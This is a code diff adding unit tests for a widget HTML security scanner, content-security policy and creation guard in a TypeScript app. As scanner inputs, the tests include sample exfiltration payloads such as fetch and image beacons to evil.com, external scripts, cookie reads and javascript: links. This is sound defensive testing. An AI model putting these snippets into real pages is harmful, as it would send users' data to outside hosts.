@@ -76,7 +76,7 @@ import {
   describeApproval,
 } from '../src/main/core/jobs-format-pure.ts';
 import type { Job } from '../src/main/core/types.ts';
-import { wrapWidgetHtml, WIDGET_CSP, WIDGET_HTML_MAX_BYTES, WIDGET_RUNTIME, WIDGET_RUNTIME_SHA256, widgetResolvePath } from '../src/main/core/widget-html-pure.ts';
+import { wrapWidgetHtml, WIDGET_CSP, WIDGET_HTML_MAX_BYTES, WIDGET_RUNTIME, WIDGET_RUNTIME_SHA256, widgetResolvePath, WIDGET_CSP_JS, wrapWidgetHtmlJs, scanWidgetHtml, widgetCreateGuard, declarativeModeWarning } from '../src/main/core/widget-html-pure.ts';
 import { createHash } from 'node:crypto';
 import { readFileSync } from 'node:fs';
 import { fileURLToPath } from 'node:url';
@@ -2364,6 +2364,92 @@ test('wrapWidgetHtml — a model CSP / external script cannot relax our policy',
   assert.ok(ours > -1 && ours < out.indexOf('<body>'), 'our CSP is in the head');
   assert.ok(theirs > out.indexOf('<body>'), 'the model CSP is trapped in the body, after ours');
   assert.ok(ours < theirs, 'ours precedes theirs — intersection keeps only the runtime hash');
+});
+
+// ── JS-enabled path: custom-protocol CSP + wrapper ───────────────────────────
+
+test('WIDGET_CSP_JS lets inline scripts run but keeps the network dead (no exfil)', () => {
+  assert.ok(WIDGET_CSP_JS.startsWith("default-src 'none'"), 'default-src none → connect/frame/etc. fall back to none');
+  assert.ok(/script-src[^;]*'unsafe-inline'/.test(WIDGET_CSP_JS), "script-src 'unsafe-inline' → model JS runs");
+  assert.ok(!/connect-src/.test(WIDGET_CSP_JS), 'no connect-src override — inherits none from default-src');
+  assert.equal(WIDGET_CSP_JS.includes('img-src data:'), true, 'images are data:-only (no remote pixel exfil)');
+});
+
+test('wrapWidgetHtmlJs — embeds the trusted runtime + model body + a defence-in-depth meta CSP', () => {
+  const out = wrapWidgetHtmlJs('<div data-alfred="x">hi</div>');
+  assert.ok(out.includes(WIDGET_RUNTIME), 'the same binding runtime is embedded');
+  assert.ok(out.indexOf('<script>') < out.indexOf('<body>'), 'runtime is in the head, before the body');
+  assert.ok(out.includes('<div data-alfred="x">hi</div>'), 'model body is present');
+  // Belt-and-suspenders: the same policy the protocol header carries is ALSO a
+  // meta, so a dropped header can never leave the widget with no CSP (no network).
+  assert.ok(out.includes(`content="${WIDGET_CSP_JS}"`), 'meta CSP equals WIDGET_CSP_JS');
+  assert.ok(out.indexOf('Content-Security-Policy') < out.indexOf('<script>'), 'CSP meta precedes the runtime script');
+});
+
+// ── widget security scanner (§2) ─────────────────────────────────────────────
+
+test('scanWidgetHtml — a benign declarative widget is ok', () => {
+  const r = scanWidgetHtml('<div style="font:40px system-ui" data-alfred="current.temp"></div><div data-alfred-sparkline="hourly.t"></div>');
+  assert.equal(r.risk, 'ok');
+  assert.deepEqual(r.findings, []);
+});
+
+test('scanWidgetHtml — flags every dangerous category', () => {
+  const cases: [string, string][] = [
+    ['<script>eval("x")</script>', 'eval'],
+    ['<script>const f=new Function("return 1")</script>', 'new Function'],
+    ['<script>fetch("https://evil.com")</script>', 'fetch'],
+    ['<script>new XMLHttpRequest()</script>', 'XMLHttpRequest'],
+    ['<script>new WebSocket("wss://x")</script>', 'WebSocket'],
+    ['<script>navigator.sendBeacon("/x", d)</script>', 'sendBeacon'],
+    ['<script src="https://evil.com/x.js"></script>', 'external script'],
+    ['<script>document.cookie</script>', 'cookie'],
+    ['<script>new Image().src="https://evil/?"+d</script>', 'new Image'],
+    ['<img src="https://evil.com/pixel.gif">', 'img src=http'],
+    ['<script>window.parent.postMessage(secret)</script>', 'window.parent'],
+    ['<script>top.location="x"</script>', 'top.'],
+    ['<a href="javascript:steal()">x</a>', 'javascript:'],
+  ];
+  for (const [html] of cases) {
+    assert.equal(scanWidgetHtml(html).risk, 'dangerous', `should be dangerous: ${html}`);
+    assert.ok(scanWidgetHtml(html).findings.length > 0);
+  }
+});
+
+test('scanWidgetHtml — flags suspicious categories (sandboxed but noteworthy)', () => {
+  // storage + inline <script> but no dangerous pattern → suspicious
+  assert.equal(scanWidgetHtml('<script>localStorage.getItem("k")</script>').risk, 'suspicious');
+  assert.equal(scanWidgetHtml('<div>localStorage</div>').risk, 'suspicious');
+  assert.equal(scanWidgetHtml('<div onclick="doThing()">x</div>').risk, 'suspicious');
+  // zero-width space hidden in text
+  assert.equal(scanWidgetHtml('<div>hel​lo</div>').risk, 'suspicious');
+  // Cyrillic homoglyph
+  assert.equal(scanWidgetHtml('<div>Аdmin</div>').risk, 'suspicious');
+});
+
+test('widgetCreateGuard — dangerous blocks, suspicious warns, ok passes', () => {
+  const bad = widgetCreateGuard('<script>fetch("https://evil")</script>');
+  assert.equal(bad.block, true);
+  assert.ok(bad.error && /dangerous/.test(bad.error));
+
+  const susp = widgetCreateGuard('<div onclick="x()" data-alfred="a"></div>');
+  assert.equal(susp.block, false);
+  assert.ok(susp.warning && /warning/.test(susp.warning));
+
+  const ok = widgetCreateGuard('<div data-alfred="a"></div>');
+  assert.equal(ok.block, false);
+  assert.equal(ok.warning, undefined);
+  assert.equal(ok.scan.risk, 'ok');
+});
+
+// ── fail-loud declarative-mode check (§3) ────────────────────────────────────
+
+test('declarativeModeWarning — warns on <script> or missing binding, silent on a proper binding', () => {
+  assert.ok(declarativeModeWarning('<script>doStuff()</script><div>x</div>'), 'a <script> never runs in OFF mode → warn');
+  assert.ok(declarativeModeWarning('<div>static</div>'), 'no data-alfred binding → never updates → warn');
+  assert.equal(declarativeModeWarning('<div data-alfred="current.temp"></div>'), null, 'a proper binding is fine');
+  assert.equal(declarativeModeWarning('<div data-alfred-sparkline="hourly.t"></div>'), null, 'sparkline binding is fine');
+  assert.equal(declarativeModeWarning('<div data-alfred-attr="title:x"></div>'), null, 'attr binding is fine');
 });
 
 // ── jobs-format-pure: the "Scheduled Tasks" card display formatters (stage 3) ──
